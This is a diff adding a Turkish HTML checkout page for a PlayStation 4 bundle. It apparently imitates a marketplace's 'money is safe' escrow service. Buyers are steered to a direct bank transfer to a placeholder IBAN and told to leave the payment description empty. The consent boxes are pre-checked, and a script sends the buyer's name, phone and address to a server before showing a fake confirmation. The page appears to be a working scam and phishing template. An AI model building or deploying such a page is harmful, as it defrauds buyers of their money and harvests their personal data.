@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ürün ve Ödeme Bilgileri</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="header">
+        <span>Ürün bilgileri</span>
+        <div class="close-btn">×</div>
+    </div>
+    <div class="content" id="product-page">
+        <div class="section-title"></div>
+        <div class="section-title">Sipariş Özeti</div>
+        <div class="product-info">
+            <img src="https://i.hizliresim.com/tto11lw.jpeg" alt="Ürün Resmi" class="product-image">
+            <div class="product-details">
+                <p>PlayStation 4 Slim 500GB Çift Kol 4 Oyun</p>
+                <p></p>
+                <a href="#">Peşin ödeme seçeneği ></a>
+            </div>
+        </div>
+        <div class="price-row">
+            <span>Ürün tutarı</span>
+            <span>5000,00TL</span>
+        </div>
+        <div class="price-row">
+            <span>S - Param Güvende Hizmet Bedeli</span>
+            <span>0 TL</span>
+        </div>
+        <div class="price-row">
+            <span>Kargo ücreti</span>
+            <span style="color: #34c759;">Ücretsiz</span>
+        </div>
+        <div class="price-row">
+            <span>Toplam tutar</span>
+            <span class="total">5000,00TL</span>
+        </div>
+        <div class="shipping-info">
+            Ürün, satıcı tarafından 3 iş gününde kargoya verilir.
+        </div>
+        <div class="security">
+            <img src="https://i.hizliresim.com/6cgyh7a.png" alt="Security">
+            <span>Paranız Güvende - Ödemeniz ürün teslim aldıktan sonra satıcıya aktarılır.</span>
+        </div>
+        <div class="shipping">
+            <img src="https://i.hizliresim.com/tkxqwkw.png" alt="Shipping">
+            <span>Ücretsiz Kargo - Aldığınız ürünü Yurtiçi ya da PTT kargo ile teslim alırsınız.</span>
+        </div>
+        <button class="button" onclick="goToPayment()">Ödemeye geç</button>
+    </div>
+    <div class="content payment-page" id="payment-page">
+        <div class="section-title"></div>
+        <div class="payment-info">
+            <h3>Ödeme Seçenekleri</h3>
+            <form id="paymentForm">
+                <div class="payment-option">
+                    <input type="radio" name="paymentMethod" value="transfer" checked required>
+                    <img src="https://i.hizliresim.com/6cgyh7a.png" alt="Havale EFT">
+                    <label>Havale / EFT</label>
+                </div>
+            </form>
+            <div class="bank-details">
+                <p><strong>IBAN: TR010101</strong></p>
+                <p><strong>Alıcı Ad Soyad: Rexo</strong></p>
+                <p class="warning">Açıklamaya herhangi bir şey yazmayınız aksi taktirde siparişiniz iptal olur.</p>
+            </div>
+        </div>
+        <div class="section-title">Teslimat Adresi</div>
+        <div class="address-info">
+            <form id="addressForm">
+                <table class="address-table">
+                    <tr>
+                        <td><label for="name">Ad Soyad:</label></td>
+                        <td><input type="text" id="name" name="name" placeholder="Örnek: Ahmet Yılmaz" required></td>
+                    </tr>
+                    <tr>
+                        <td><label for="phone">Telefon Numarası:</label></td>
+                        <td><input type="tel" id="phone" name="phone" placeholder="Örnek: 0555 123 45 67" required></td>
+                    </tr>
+                    <tr>
+                        <td><label for="city">Şehir:</label></td>
+                        <td><input type="text" id="city" name="city" placeholder="Örnek: İstanbul" required></td>
+                    </tr>
+                    <tr>
+                        <td><label for="district">İlçe:</label></td>
+                        <td><input type="text" id="district" name="district" placeholder="Örnek: Kadıköy" required></td>
+                    </tr>
+                    <tr>
+                        <td><label for="address">Açık Adres:</label></td>
+                        <td><input type="text" id="address" name="address" placeholder="Örnek: Örnek Mah. Örnek Sokak. No: 10" required></td>
+                    </tr>
+                </table>
+            </form>
+        </div>
+        <div class="total-row">
+            <span>Toplam Tutar</span>
+            <span class="total">5000.00 TL</span>
+        </div>
+        <button class="button" onclick="submitForm()">Ödemeyi Yaptım</button>
+        <div class="agreement">
+            <div class="checkbox-group">
+                <input type="checkbox" id="agree1" checked>
+                <label for="agree1">Satış Sözleşmesini okudum ve kabul ediyorum.</label>
+            </div>
+            <div class="checkbox-group">
+                <input type="checkbox" id="agree2" checked>
+                <label for="agree2">Ön Bilgilendirme Formu ve Mesafeli Satış Sözleşmesini okudum ve kabul ediyorum.</label>
+            </div>
+            <div class="checkbox-group">
+                <input type="checkbox" id="agree3" checked>
+                <label for="agree3">Kullanım Koşulları ve Gizlilik Politikası’nı okudum ve kabul ediyorum.</label>
+            </div>
+        </div>
+    </div>
+    <script>
+        function goToPayment() {
+            document.getElementById('product-page').style.display = 'none';
+            document.getElementById('payment-page').style.display = 'block';
+        }
+
+        function goToProduct() {
+            document.getElementById('payment-page').style.display = 'none';
+            document.getElementById('product-page').style.display = 'block';
+        }
+
+        function submitForm() {
+            const paymentForm = document.getElementById('paymentForm');
+            const addressForm = document.getElementById('addressForm');
+            const paymentMethod = paymentForm.paymentMethod.value;
+            const name = addressForm.name.value;
+            const phone = addressForm.phone.value;
+            const city = addressForm.city.value;
+            const district = addressForm.district.value;
+            const address = addressForm.address.value;
+
+            const data = {
+                paymentMethod: paymentMethod,
+                name: name,
+                phone: phone,
+                city: city,
+                district: district,
+                address: address
+            };
+
+            fetch('/submit', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.text())
+            .then(result => {
+                const confirmation = document.createElement('div');
+                confirmation.className = 'confirmation';
+                confirmation.textContent = 'Ödemeniz onaylandıktan sonra sms ile bilgilendirme yapılacaktır';
+                document.getElementById('payment-page').appendChild(confirmation);
+                
+                setTimeout(() => {
+                    confirmation.classList.add('fade-out');
+                    setTimeout(() => confirmation.remove(), 300);
+                }, 4700); // 4.7 saniye sonra fade-out başlar, 0.3 saniye sonra kaybolur
+            })
+            .catch(error => console.error('Hata:', error));
+        }
+    </script>
+</body>
+</html>
